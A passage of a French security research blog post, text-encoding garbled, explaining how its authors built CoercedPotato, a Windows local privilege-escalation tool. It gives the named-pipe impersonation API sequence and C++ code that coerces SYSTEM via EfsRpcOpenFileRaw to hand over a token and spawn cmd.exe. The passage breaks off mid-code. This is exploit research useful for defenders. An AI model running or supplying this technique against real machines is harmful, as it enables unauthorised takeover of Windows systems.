implÃ©mentÃ©e par lâ€™interface RPC &lt;strong&gt;MS-EFSRPC&lt;/strong&gt;. Cette fonction permet
lâ€™ouverture dâ€™un objet chiffrÃ© sur un serveur, afin dâ€™effectuer une
sauvegarde ou de la restaurer.&lt;/p&gt;

&lt;p&gt;Dans le courant de lâ€™annÃ©e 2022, le travail de P0dalirius a 
montrÃ© quâ€™il existe une multitude de fonctions RPC pouvant Ãªtre
exploitÃ©es pour forcer des authentifications grÃ¢ce Ã  son outil Coercer
(&lt;a href=&quot;https://github.com/p0dalirius/Coercer&quot;&gt;https://github.com/p0dalirius/Coercer&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;De plus, de nombreuses mÃ©thodes nâ€™ont pas encore Ã©tÃ© testÃ©es, mais
pourraient Ãªtre exploitÃ©es pour forcer une authentificationÂ :
&lt;a href=&quot;https://github.com/p0dalirius/windows-coerced-authentication-methods&quot;&gt;https://github.com/p0dalirius/windows-coerced-authentication-methods&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Lâ€™idÃ©e nous est donc venue de la combinaison des techniques utilisÃ©es
par lâ€™outil PrintSpoofer associÃ©es aux fonctions RPC vulnÃ©rables
remontÃ©es par @P0dalirius.&lt;/p&gt;

&lt;p&gt;Notre outil a ainsi pour vocation de regrouper toutes les mÃ©thodes de
coercition en local permettant une Ã©lÃ©vation de privilÃ¨ges Ã  partir des
privilÃ¨ges &lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt; et &lt;strong&gt;SeAssignPrimaryToken&lt;/strong&gt;.&lt;/p&gt;

&lt;h1 id=&quot;un-peu-de-code-maintenant-c-on-fire&quot;&gt;&lt;strong&gt;Un peu de code maintenant (C++ on fire)Â !&lt;/strong&gt;&lt;/h1&gt;

&lt;p&gt;En combinant les concepts expliquÃ©s prÃ©cÃ©demment, nous avons donc crÃ©Ã©
lâ€™outil CoercedPotato qui exploite le privilÃ¨ge
&lt;strong&gt;SeImpersonatePrivilege&lt;/strong&gt; ou &lt;strong&gt;SeAssignPrimaryToken&lt;/strong&gt; pour compromettre
une machine Windows.&lt;/p&gt;

&lt;p&gt;Rentrons dans le dur maintenantÂ !Â &lt;/p&gt;

&lt;h2 id=&quot;ouverture-dun-serveur-pipe&quot;&gt;Ouverture dâ€™un serveur pipe&lt;/h2&gt;

&lt;p&gt;La premiÃ¨re Ã©tape consiste Ã  lancer un serveur pipe qui attend une
connexion sur un &lt;strong&gt;named pipe.&lt;/strong&gt; Lâ€™objectif est de rÃ©cupÃ©rer une
connexion du compte &lt;strong&gt;SYSTEM&lt;/strong&gt;, donc son &lt;strong&gt;access token&lt;/strong&gt;, et dâ€™exÃ©cuter
du code en son nom.&lt;/p&gt;

&lt;p&gt;Pour ce faire, dans un nouveau thread, nous lanÃ§ons les fonctions
suivantesÂ :&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;CreateNamedPipe&lt;/strong&gt;() â€“ CrÃ©ation dâ€™un serveur pipe en Ã©coute sur le
&lt;strong&gt;named pipe&lt;/strong&gt; donnÃ© en paramÃ¨tre. En fonction des appels RPC que
nous ferons par la suite, nous Ã©coutons sur un named pipe spÃ©cifique
(par exempleÂ : &lt;strong&gt;\.\pipe\coerced\pipe\srvsvc&lt;/strong&gt;).&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;CreateNamedPipe&lt;/strong&gt;(lpName, PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE |
PIPE_WAIT, 10, 2048, 2048, 0, &amp;amp;sa)&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;ConnectNamedPipe()&lt;/strong&gt; â€“ Mise du serveur pipe en attente dâ€™une
connexion entrante. Cela permet de mettre en pause le thread.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;ConnectNamedPipe&lt;/strong&gt;(hPipe, NULL)&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;ImpersonateNamedPipeClient()&lt;/strong&gt; â€“ Une fois une connexion obtenue,
nous nous placons dans le contexte de sÃ©curitÃ© du client pour le reste du
code exÃ©cutÃ©. La connexion est contenue dans la variable &lt;strong&gt;hPipe&lt;/strong&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;ImpersonateNamedPipeClient&lt;/strong&gt;(hPipe)&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;OpenThreadToken()&lt;/strong&gt; â€“ Lancement dâ€™un nouveau thread dans le contexte
de sÃ©curitÃ© du client. Cela nâ€™est possible que si la connexion au
serveur pipe a Ã©tÃ© effectuÃ©e avec un &lt;strong&gt;impersonation token&lt;/strong&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;OpenThreadToken&lt;/strong&gt;(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE,
&amp;amp;hToken)&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;CreateProcessWithTokenW()&lt;/strong&gt; â€“ Dans ce thread, nous venons dÃ©marrer un
nouveau processus (par exemple &lt;strong&gt;cmd.exe&lt;/strong&gt;) Ã  lâ€™aide de
lâ€™&lt;strong&gt;impersonation token&lt;/strong&gt;. Cela nâ€™est possible quâ€™avec un
&lt;strong&gt;impersonation token&lt;/strong&gt; de niveau 3 ou 4.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;CreateProcessWithTokenW&lt;/strong&gt;(hToken, LOGON_NETCREDENTIALS_ONLY, NULL,
newCommandLine, dwCreationFlags, lpEnvironment, lpCurrentDirectory, &amp;amp;si,
&amp;amp;pi)&lt;/p&gt;

&lt;p&gt;Et voilÃ Â ! Nous sommes maintenant capables dâ€™exÃ©cuter du code en tant
quâ€™un autre utilisateur dÃ¨s lors quâ€™il se connecte sur notre serveur
pipe.&lt;/p&gt;

&lt;p&gt;Toutes ces fonctions sont documentÃ©es sur le site de Microsoft
&lt;a href=&quot;https://learn.microsoft.com/&quot;&gt;https://learn.microsoft.com/&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Maintenant que tout est en place, il ne reste plus quâ€™Ã  forcer le compte
&lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt; Ã  sâ€™authentifierÂ !&lt;/p&gt;

&lt;h2 id=&quot;crÃ©ation-du-lien-rpc&quot;&gt;CrÃ©ation du lien RPC&lt;/h2&gt;

&lt;p&gt;Selon la fonction RPC vulnÃ©rable que nous allons appeler, il peut Ãªtre
nÃ©cessaire de crÃ©er une liaison avec lâ€™interface RPC que nous voulons
utiliser : nous devons crÃ©er un &lt;strong&gt;RPC binding&lt;/strong&gt; &lt;strong&gt;handle&lt;/strong&gt;. Une
interface RPC pourrait sâ€™apparenter Ã  une classe en programmation
orientÃ©e objet. Elle implÃ©mente donc un certain nombre de
mÃ©thodes/fonctions. Nous commenÃ§ons par dÃ©finir la maniÃ¨re dont la
connexion RPC doit Ãªtre Ã©tablie en appelant la fonction
&lt;strong&gt;RpcStringBindingCompose()&lt;/strong&gt; :&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;RpcStringBindingCompose&lt;/strong&gt;(nullptr, (RPC_WSTR)Lâ€ncalrpcâ€, nullptr,
nullptr, nullptr, &amp;amp;bindingString);&lt;/p&gt;

&lt;p&gt;Cela va permettre de crÃ©er une description de la liaison RPC qui va Ãªtre
Ã©tablie pour spÃ©cifier un certain nombre de paramÃ¨tres. Nous spÃ©cifions
dâ€™ailleurs le paramÃ¨tre &lt;strong&gt;sequence protocol&lt;/strong&gt;, ici &lt;strong&gt;ncalrpc&lt;/strong&gt;, qui est
un protocole permettant les connexions interprocessus. Le pointeur NULL
sur les autres paramÃ¨tres permet une liaison dynamique des interfaces
RPC auxquelles se connecter et dâ€™effectuer les connexions en local.&lt;/p&gt;

&lt;p&gt;Nous lanÃ§ons ensuite la fonction &lt;strong&gt;RpcBindingFromStringBinding&lt;/strong&gt; pour
effectuer la connexion RPC sur le serveur cible (localhost dans notre
cas) et rÃ©cupÃ©rer cette liaison dans la variable &lt;strong&gt;Binding&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;RpcBindingFromStringBinding&lt;/strong&gt;(bindingString, &amp;amp;binding_h)&lt;/p&gt;

&lt;p&gt;Et voilÃ Â ! Nous avons maintenant Ã©tabli une connexion RPC en local.
Cette liaison RPC peut Ãªtre maintenant utilisÃ©e pour appeler des
fonctions RPC implÃ©mentÃ©es sur diffÃ©rentes interfaces.&lt;/p&gt;

&lt;h2 id=&quot;maintenant-que-tout-est-en-place-plus-quÃ -appeler-une-fonction-rpc-vulnÃ©rable&quot;&gt;Maintenant que tout est en place, plus quâ€™Ã  appeler une fonction RPC vulnÃ©rable&lt;/h2&gt;

&lt;p&gt;La fin de la partie technique est proche, tenez bonÂ !Â ğŸ˜Š&lt;/p&gt;

&lt;p&gt;Pour faire appel Ã  une fonction RPC en C++, nous devons premiÃ¨rement
disposer dâ€™un client compilÃ© de lâ€™interface ciblÃ©e : pour lâ€™exemple,
nous prendrons &lt;strong&gt;MS-EFSR&lt;/strong&gt;. Pour faire simple, pour appeler les
fonctions qui nous intÃ©ressent, il faut le code qui implÃ©mente les
fonctions RPC, notre client RPC.&lt;/p&gt;

&lt;p&gt;Câ€™est lÃ  que Ã§a se compliqueâ€¦ Lâ€™objectif est donc de rÃ©cupÃ©rer un
fichier IDL (Interface Definition File) dÃ©crivant les fonctions de
lâ€™interface RPC. Ce fichier permet de compiler le code pour le client et
le serveur. Lâ€™auteur @itm4n a (heureusement) Ã©crit un article permettant
grandement dâ€™aider les personnes se lanÃ§ant dans cette quÃªteÂ :
&lt;a href=&quot;https://itm4n.github.io/from-rpcview-to-petitpotam/&quot;&gt;https://itm4n.github.io/from-rpcview-to-petitpotam/&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Finalement, aprÃ¨s avoir tentÃ© plusieurs techniques compliquÃ©es et non
concluantes, il sâ€™est avÃ©rÃ© quâ€™une mÃ©thode reste la plus fiableÂ : RTFMÂ !&lt;/p&gt;

&lt;p&gt;Pour chaque interface RPC, Microsoft a publiÃ© le fichier IDL dans la
documentation officielle.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/4a25b8e1-fd90-41b6-9301-62ed71334436&quot;&gt;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/4a25b8e1-fd90-41b6-9301-62ed71334436&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image9.png&quot; style=&quot;width:6.3in;height:4.57222in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture dâ€™Ã©cran, Police Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Il suffit donc de copier-coller le contenu de lâ€™IDL dans un fichier .idl
dâ€™un projet Visual Studio et de le compiler. A force de nous battre avec
les problÃ¨mes de typages,nous avons fini par trouver une solution plutÃ´t simple.
Voici notre recette :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image10.jpeg&quot; style=&quot;width:0.18056in;height:0.19861in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant Visage humain, personne, habits, Humain Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;Une
fois le contenu du fichier IDL rÃ©cupÃ©rÃ© et collÃ© dans un fichier,
retirer la ligne &lt;strong&gt;import â€œms-dtyp.idlâ€;&lt;/strong&gt;. Garder cette ligne
gÃ©nÃ¨re un grand nombre de problÃ¨mes de typage qui sont fastidieux Ã 
dÃ©bugger.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Compiler lâ€™IDL pour dÃ©tecter de potentiels problÃ¨mes de dÃ©finition
de types.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image11.png&quot; style=&quot;width:4.59259in;height:1.03526in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture dâ€™Ã©cran, Police, logiciel Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;En fonction de ce qui est remontÃ©, ajouter la dÃ©finition en dÃ©but de
fichiers. La dÃ©finition de ces types se retrouve iciÂ :&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/24637f2d-238b-4d22-b44d-fe54b024280c&quot;&gt;https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/24637f2d-238b-4d22-b44d-fe54b024280c&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image12.png&quot; style=&quot;width:3.42587in;height:1.67593in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture dâ€™Ã©cran, Police, algÃ¨bre Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Continuer ces deux derniÃ¨res Ã©tapes jusquâ€™Ã  ce que la compilation
fonctionne sans erreur.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Une fois compilÃ©, le fichier IDL permet dâ€™obtenir trois fichiersÂ :
&lt;strong&gt;ms-efsr_c.c&lt;/strong&gt; (le client RPC), &lt;strong&gt;ms-efsr_s.c&lt;/strong&gt; (le serveur RPC) et
&lt;strong&gt;ms-efsr_h.h&lt;/strong&gt; (fichier dâ€™entÃªtes). Ceux qui nous intÃ©ressent dans le
cadre de lâ€™exploit sont le fichier client RPC et le fichier dâ€™entÃªtes.
Ces fichiers implÃ©mentent donc toutes les fonctions RPC de lâ€™interface
&lt;strong&gt;MS-EFSR&lt;/strong&gt; :&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image13.png&quot; style=&quot;width:3.84466in;height:1.44062in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture dâ€™Ã©cran, Police, affichage Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Il ne nous reste plus quâ€™Ã  lâ€™appeler ! Personnellement, le C et le C++,
ce nâ€™est pas ma tasse de thÃ©. Ã‡a tombe bien, bien utilisÃ©, ChatGPT est plutÃ´t
douÃ© pour Ã§aÂ !Â ğŸ˜Š&lt;/p&gt;

&lt;p&gt;Nous allons donc lui demander de nous fournir le code permettant dâ€™initialiser
correctement chaque paramÃ¨tre pour chaque fonction.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image14.png&quot; style=&quot;width:5.76096in;height:3.65648in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, Appareils Ã©lectroniques, capture dâ€™Ã©cran, logiciel Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Et voilÃ Â ! Toutes les fonctions sont implÃ©mentÃ©esÂ ! Il ne reste plus
quâ€™Ã  les appeler pour forcer lâ€™utilisateur &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt; Ã 
sâ€™authentifier sur notre named pipe en Ã©coute.&lt;/p&gt;

&lt;p&gt;Câ€™est Ã  ce moment-lÃ  que le bug liÃ© aux Â«Â /Â Â» va faire en sorte quâ€™un
processus dÃ©marrÃ© par &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt; (dans notre cas,
&lt;strong&gt;lsass.exe&lt;/strong&gt;) se connecte sur un &lt;strong&gt;named pipe&lt;/strong&gt; arbitraire. Par
exemple, dans le cas de la fonction &lt;strong&gt;EfsRpcOpenFileRaw&lt;/strong&gt;, nous plaÃ§ons 
notre payload dans le paramÃ¨tre &lt;strong&gt;FileName&lt;/strong&gt;, qui correspond au
fichier chiffrÃ© que le serveur doit ouvrir pour rÃ©aliser ou restaurer
une sauvegarde. En lâ€™occurrence, nous lui indiquons le fichier
&lt;strong&gt;\127.0.0.1/pipe/coerced\C$\x00&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Par exemple, pour la fonction &lt;strong&gt;EfsRpcOpenFileRaw()&lt;/strong&gt;, nous dÃ©finissons
le payload de la sorteÂ :&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;n&quot;&gt;LPWSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetedPipeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;targetedPipeName&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPWSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LocalAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;LPTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_PATH&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;WCHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;StringCchPrintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;targetedPipeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;MAX&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_PATH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
&lt;span class=&quot;s&quot;&gt;L&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;127.0.0.1/pipe/coerced&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;C$&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;long&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;PVOID&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EfsRpcOpenFileRaw&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Binding&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pContext&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;targetedPipeName&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Comme expliquÃ© prÃ©cÃ©demment, Ã  cause une mauvaise interprÃ©tation du
systÃ¨me Windows, une requÃªte est effectuÃ©e sur le fichier
&lt;a href=&quot;file:///\\127.0.0.1\pipe\coerced\pipe\srvsvc&quot;&gt;\127.0.0.1\pipe\coerced\pipe\srvsvc&lt;/a&gt;
par le compte &lt;strong&gt;NT AUTHORITY\SYSTEM&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image15.png&quot; style=&quot;width:5.87746in;height:0.48827in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant capture dâ€™Ã©cran, texte, logiciel, Logiciel multimÃ©dia Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image15.png&quot; style=&quot;width:5.896in;height:0.69375in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant capture dâ€™Ã©cran, texte, logiciel, Logiciel multimÃ©dia Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;/p&gt;

&lt;p&gt;GrÃ¢ce Ã  notre serveur pipe, nous rÃ©cupÃ©rons lâ€™authentification et nous lanÃ§ons 
un nouveau processus â€œcmd.exeâ€Â !&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image16.png&quot; style=&quot;width:6.3in;height:1.77292in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture dâ€™Ã©cran, Police, logiciel Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That is all folks ğŸ˜Š. Et en prime, un petit schÃ©ma rÃ©capitulatif de
lâ€™attaqueÂ !&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image17.png&quot; style=&quot;width:5.94589in;height:4.68903in;display:block; margin-left:auto; margin-right:auto&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;finalement-coercedpotato&quot;&gt;Finalement, CoercedPotatoÂ !&lt;/h2&gt;

&lt;p&gt;Nous avons finalement abouti Ã  la crÃ©ation dâ€™un outil Ã©largissant ce
comportement sur lâ€™ensemble (ou presque) des fonctions RPC connues pour
Ãªtre vulnÃ©rables.&lt;/p&gt;

&lt;p&gt;Ainsi, il est possible de choisir de maniÃ¨re prÃ©cise quelle fonction RPC
utiliser, ou de toutes les forcer afin dâ€™en trouver une valide.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image18.png&quot; style=&quot;width:6.3in;height:3.64444in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture dâ€™Ã©cran, Police, conception Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A date de lâ€™article, seules les interfaces suivantes sont exploitablesÂ :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Des fonctions implÃ©mentÃ©es sur lâ€™interface &lt;strong&gt;MS-RPRN&lt;/strong&gt;Â ;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Des fonctions implÃ©mentÃ©es sur lâ€™interface &lt;strong&gt;MS-EFSR&lt;/strong&gt;.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;La finalitÃ© de &lt;strong&gt;CoercedPotato&lt;/strong&gt; est de parcourir lâ€™ensemble de ces
mÃ©thodes de coercition jusquâ€™Ã  en trouver une qui fonctionne.&lt;/p&gt;

&lt;h2 id=&quot;avancement-de-notre-recherche-petite-dÃ©sillusion&quot;&gt;Avancement de notre rechercheÂ : petite dÃ©sillusion&lt;/h2&gt;

&lt;p&gt;Comme indiquÃ© prÃ©cÃ©demment, P0dalirus a rassemblÃ© un ensemble de
fonctions RPC vulnÃ©rables pour forcer une authentification dâ€™un compte
machine sur le rÃ©seau, le tout dans lâ€™outil Coercer
(&lt;a href=&quot;https://github.com/p0dalirius/Coercer&quot;&gt;https://github.com/p0dalirius/Coercer&lt;/a&gt;). Ce projet est notamment
accompagnÃ© dâ€™un autre projet qui rÃ©fÃ©rence toutes les fonctions RPC
potentiellement vulnÃ©rables, mais qui nâ€™ont pas encore Ã©tÃ© testÃ©es,
soient plus de 240 fonctionsâ€¦
(&lt;a href=&quot;https://github.com/p0dalirius/windows-coerced-authentication-methods&quot;&gt;https://github.com/p0dalirius/windows-coerced-authentication-methods&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;Dâ€™instinct, nous sommes partis du principe que toutes ces mÃ©thodes
seraient exploitables dans le cadre dâ€™une escalade de privilÃ¨ges en
local. Maisâ€¦ câ€™est plus compliquÃ© que Ã§a !&lt;/p&gt;

&lt;p&gt;Les fonctions RPC vulnÃ©rables qui sont aujourdâ€™hui identifiÃ©es ont
toutes un point communÂ : elles prennent en entrÃ©e le chemin dâ€™un fichier
qui est censÃ© Ãªtre requÃªtÃ© par un processus lancÃ© par le compte
&lt;strong&gt;SYSTEM&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Dans le cadre de &lt;strong&gt;MS-RPRN&lt;/strong&gt;, câ€™est le processus &lt;strong&gt;spoolsv.exe&lt;/strong&gt; qui
effectue une requÃªte sur le named pipe. Pour &lt;strong&gt;MS-EFSR&lt;/strong&gt;, câ€™est
&lt;strong&gt;lsass.exe&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Maintenant, prenons dâ€™autres interfaces qui nâ€™ont pas encore Ã©tÃ© testÃ©es,
par exemple &lt;strong&gt;MS-EVEN&lt;/strong&gt;. Cette interface RPC est implÃ©mentÃ©e par le
processus &lt;strong&gt;svchost.exe&lt;/strong&gt; dans le contexte de sÃ©curitÃ© de lâ€™utilisateur
&lt;strong&gt;NT AUTHORITY\LOCAL SERVICE&lt;/strong&gt;, soit un compte local disposant du niveau
de privilÃ¨ges limitÃ©s.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image19.png&quot; style=&quot;width:4.21781in;height:2.01062in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, capture dâ€™Ã©cran, affichage, nombre Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Par consÃ©quent, forcer ce processus Ã  effectuer une authentification sur
un named pipe que nous contrÃ´lons nâ€™a pas forcÃ©ment de sens dans notre
quÃªte dâ€™Ã©lÃ©vation de privilÃ¨ges, puisque nous rÃ©cupÃ©rons une connexion du
compte &lt;strong&gt;NT AUTHORITY\LOCAL SERVICE&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image20.png&quot; style=&quot;width:6.3in;height:2.06736in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, logiciel, Police, Page web Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Toutes les fonctions RPC des interfaces RPC implÃ©mentÃ©es par des
processus lancÃ©s dans le contexte de sÃ©curitÃ© dâ€™utilisateurs Ã  faibles
privilÃ¨ges ne sont donc pas intÃ©ressantes dans notre cas.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Prenons ensuite le cas de &lt;strong&gt;MS-SRVS&lt;/strong&gt;. Cette interface RPC est bien
implÃ©mentÃ©e par un processus lancÃ© en tant que &lt;strong&gt;SYSTEM&lt;/strong&gt;. Mais ce nâ€™est
forcÃ©ment pas suffisantÂ !&lt;/p&gt;

&lt;p&gt;Prenons lâ€™une de ses fonctions RPC telles que dÃ©finies dans la
documentation MicrosoftÂ : &lt;strong&gt;NetrFileGetInfo()&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/articles/coercedpotato/image21.png&quot; style=&quot;width:6.3in;height:2.21319in;display:block; margin-left:auto; margin-right:auto&quot; alt=&quot;Une image contenant texte, Police, capture dâ€™Ã©cran, blanc Description gÃ©nÃ©rÃ©e automatiquement&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Elle prend en paramÃ¨tre 4 variablesÂ : &lt;strong&gt;ServerName&lt;/strong&gt;, soit lâ€™adresse
serveur qui peut Ãªtre un named pipe, &lt;strong&gt;FileId&lt;/strong&gt;, soit lâ€™ID dâ€™un fichier
(inconnu dans notre cas), &lt;strong&gt;Level&lt;/strong&gt;, soit le niveau dâ€™information que
nous voulons rÃ©cupÃ©rer et &lt;strong&gt;InfoStruct&lt;/strong&gt;, soit la variable qui recueille
les informations du fichier. Nous Ã©crivons ainsi le code suivant
permettant dâ€™appeler cette fonctionÂ :&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
